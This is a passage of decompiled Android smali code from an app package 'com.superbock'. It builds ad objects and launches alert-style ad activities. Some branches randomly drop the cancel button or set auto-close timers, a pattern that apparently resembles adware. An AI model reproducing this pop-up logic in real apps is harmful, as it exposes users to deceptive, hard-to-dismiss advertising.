    const/16 v1, 0x3ee

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    invoke-virtual {v1, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    const/4 v5, 0x1

    if-lt v1, v5, :cond_18

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_18
    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_a
    const/4 v1, 0x2

    invoke-static {v1}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v5, 0xcd

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v8}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_19

    move-object v8, v1

    goto :goto_9

    :cond_19
    move-object/from16 v8, v21

    :goto_9
    invoke-virtual {v2, v8}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v1, 0x8

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v1, 0x7f0f0114

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v1, 0x7f0f0115

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v1, 0x7f0f0004

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    const-string v1, "0,0,255"

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAlign(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x2

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    if-ne v5, v1, :cond_1a

    const v1, 0x7f0f0001

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_1a
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v1, 0x3ed

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    invoke-virtual {v1, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    const/4 v5, 0x1

    if-lt v1, v5, :cond_1b

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_1b
    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdAlertBottomActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_b
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0xcc

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_1c

    goto :goto_a

    :cond_1c
    move-object/from16 v0, v19

    :goto_a
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/4 v0, 0x7

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f00be

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f00bb

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f001f

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v13}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3ec

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    invoke-virtual {v2, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    const/4 v5, 0x1

    if-lt v2, v5, :cond_1d

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_1d
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdAlertActivity;

    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_c
    const/4 v1, 0x2

    invoke-static {v1}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v5, 0xcb

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v11}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-static {v3, v1}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_1e

    move-object v5, v1

    goto :goto_b

    :cond_1e
    move-object/from16 v5, v18

    :goto_b
    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v1, 0x8

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v1, 0x7f0f008a

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v1, 0x7f0f0086

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v1, 0x7f0f0010

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v2, v14}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    invoke-virtual {v2, v13}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    const/4 v1, 0x1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setAlign(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/4 v6, 0x2

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    if-ne v5, v1, :cond_1f

    const v1, 0x7f0f0001

    invoke-virtual {v3, v1}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setCancelColor(Ljava/lang/String;)V

    :cond_1f
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v6}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v1, 0x3eb

    invoke-virtual {v0, v1}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v1, Ljava/util/Random;

    invoke-direct {v1}, Ljava/util/Random;-><init>()V

    invoke-virtual {v1, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v1

    const/4 v5, 0x1

    if-lt v1, v5, :cond_20

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_20
    invoke-virtual {v2, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v1, Lcom/superbock/ui/AdAlertBottomActivity;

    invoke-direct {v0, v3, v1}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_d
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0xca

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_21

    move-object v11, v0

    goto :goto_c

    :cond_21
    move-object/from16 v11, v17

    :goto_c
    invoke-virtual {v1, v11}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/4 v0, 0x7

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f00fd

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f0101

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0003

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    invoke-virtual {v1, v15}, Lcom/superbock/bean/AdInfo;->setConfirmColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v5, 0x1

    if-ne v0, v5, :cond_22

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    :cond_22
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3ea

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    invoke-virtual {v2, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    const/4 v5, 0x1

    if-lt v2, v5, :cond_23

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_23
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCancel()Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_24

    const-class v2, Lcom/superbock/ui/AdAlertActivity;

    goto :goto_d

    :cond_24
    const-class v2, Lcom/superbock/ui/AdAlertOneButtonActivity;

    :goto_d
    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_e
    const/4 v0, 0x2

    invoke-static {v0}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v1

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/16 v2, 0xc9

    invoke-virtual {v1, v2}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    move-object/from16 v5, v22

    invoke-virtual {v1, v5}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v0

    invoke-static {v3, v0}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    if-eqz v0, :cond_25

    move-object v9, v0

    goto :goto_e

    :cond_25
    move-object/from16 v9, v16

    :goto_e
    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    const/16 v0, 0x9

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v0, 0x7f0f002d

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v0, 0x7f0f000a

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v0, 0x7f0f0020

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setConfirm(Ljava/lang/String;)V

    move-object/from16 v6, v20

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setConfirmBgColor(Ljava/lang/String;)V

    invoke-virtual {v1, v14}, Lcom/superbock/bean/AdInfo;->setBgColor(Ljava/lang/String;)V

    new-instance v0, Ljava/util/Random;

    invoke-direct {v0}, Ljava/util/Random;-><init>()V

    const/4 v2, 0x2

    invoke-virtual {v0, v2}, Ljava/util/Random;->nextInt(I)I

    move-result v0

    const/4 v5, 0x1

    if-ne v0, v5, :cond_26

    const v0, 0x7f0f0001

    invoke-virtual {v3, v0}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setCancel(Ljava/lang/String;)V

    :cond_26
    new-instance v0, Lcom/superbock/bean/AdInfo;

    invoke-direct {v0}, Lcom/superbock/bean/AdInfo;-><init>()V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v5

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v1}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    const/16 v2, 0x3e9

    invoke-virtual {v0, v2}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    new-instance v2, Ljava/util/Random;

    invoke-direct {v2}, Ljava/util/Random;-><init>()V

    invoke-virtual {v2, v10}, Ljava/util/Random;->nextInt(I)I

    move-result v2

    const/4 v5, 0x1

    if-lt v2, v5, :cond_27

    invoke-virtual {v0, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    :cond_27
    invoke-virtual {v1, v0}, Lcom/superbock/bean/AdInfo;->setAiLink(Lcom/superbock/bean/AdInfo;)V

    new-instance v0, Landroid/content/Intent;

    const-class v2, Lcom/superbock/ui/AdBoxActivity;

    invoke-direct {v0, v3, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v0, v4, v1}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/io/Serializable;)Landroid/content/Intent;

    invoke-static {v3, v0}, Lk3/d;->e(Landroid/content/Context;Landroid/content/Intent;)V

    goto/16 :goto_1b

    :pswitch_f
    invoke-static {v3}, Lk3/e;->e(Landroid/content/Context;)V

    goto/16 :goto_1b

    :pswitch_10
    invoke-static {v3}, Lk3/e;->a(Landroid/content/Context;)V

    goto/16 :goto_1b

    :pswitch_11
    invoke-static {v3}, Lk3/e;->g(Landroid/content/Context;)V

    goto/16 :goto_1b

    :pswitch_12
    invoke-static {v3}, Lk3/e;->h(Landroid/content/Context;)V

    goto/16 :goto_1b

    :pswitch_13
    const/4 v2, 0x2

    invoke-static {v2}, Landroidx/appcompat/view/a;->d(I)Lcom/superbock/bean/AdInfo;

    move-result-object v2

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    const/4 v5, 0x1

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setBack(I)V

    new-instance v5, Ljava/util/Random;

    invoke-direct {v5}, Ljava/util/Random;-><init>()V

    const/16 v6, 0x14

    invoke-virtual {v5, v6}, Ljava/util/Random;->nextInt(I)I

    move-result v5

    add-int/2addr v5, v6

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setAutoClose(I)V

    const/16 v5, 0x3ed

    invoke-virtual {v2, v5}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2, v8}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    const/4 v6, 0x2

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v6

    invoke-static {v3, v6}, Lk3/e;->c(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v6

    if-eqz v6, :cond_28

    invoke-virtual {v2, v6}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    move-object/from16 v7, v21

    goto :goto_f

    :cond_28
    move-object/from16 v7, v21

    invoke-virtual {v2, v7}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_f
    const/4 v8, 0x1

    invoke-virtual {v2, v8}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    const v8, 0x7f0f0114

    invoke-virtual {v3, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v9

    invoke-static {v3, v9}, Lk3/e;->d(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v2, v9}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v9, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Lcom/superbock/bean/AdInfo;->setLink(Ljava/lang/String;)V

    new-instance v1, Lcom/superbock/bean/AdInfo;

    invoke-direct {v1}, Lcom/superbock/bean/AdInfo;-><init>()V

    const/4 v9, 0x2

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setType(I)V

    invoke-static {}, Le3/d;->a()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v1, v12}, Lcom/superbock/bean/AdInfo;->setTaskId(Ljava/lang/String;)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getCustomId()I

    move-result v12

    invoke-virtual {v1, v12}, Lcom/superbock/bean/AdInfo;->setCustomId(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getPkg()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v1, v12}, Lcom/superbock/bean/AdInfo;->setPkg(Ljava/lang/String;)V

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setUse(I)V

    invoke-virtual {v2}, Lcom/superbock/bean/AdInfo;->getTaskId()Ljava/lang/String;

    move-result-object v9

    invoke-virtual {v1, v9}, Lcom/superbock/bean/AdInfo;->setPreId(Ljava/lang/String;)V

    if-eqz v6, :cond_29

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    goto :goto_10

    :cond_29
    invoke-virtual {v1, v7}, Lcom/superbock/bean/AdInfo;->setImg(Ljava/lang/String;)V

    :goto_10
    const/16 v6, 0x8

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setTemplate(I)V

    invoke-virtual {v3, v8}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setTitle(Ljava/lang/String;)V

    const v6, 0x7f0f0115

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

    invoke-virtual {v1, v6}, Lcom/superbock/bean/AdInfo;->setMsg(Ljava/lang/String;)V

    const v6, 0x7f0f0004

    invoke-virtual {v3, v6}, Landroid/content/Context;->getString(I)Ljava/lang/String;

    move-result-object v6

